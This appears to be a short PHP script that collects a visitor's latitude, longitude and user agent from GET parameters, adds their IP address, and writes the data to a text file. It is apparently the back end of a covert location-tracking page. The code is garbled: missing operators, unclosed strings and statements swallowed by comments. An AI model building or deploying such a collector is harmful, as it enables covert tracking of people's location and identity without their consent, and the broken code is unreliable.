<?php // Open or create location.txt in write mode

$myFile = fopen("location.txt", "w");

// Retrieve values passed via GET request and the visitor's IP address $lat = $_GET['lat']; $long = $_GET['long']; $uagent = $_GET['uagent'];

$ip = $_SERVER['REMOTE_ADDR'];

// Format string output with line breaks

$txt = "Latitude: " . $lat . "\n" . "Longitude: " $long . "\n" "IP: " . $ip . "\n"

"User Agent:

$uagent

// Write formatted data to location.txt and close file fwrite($myFile, $txt); fclose($myFile);

?>
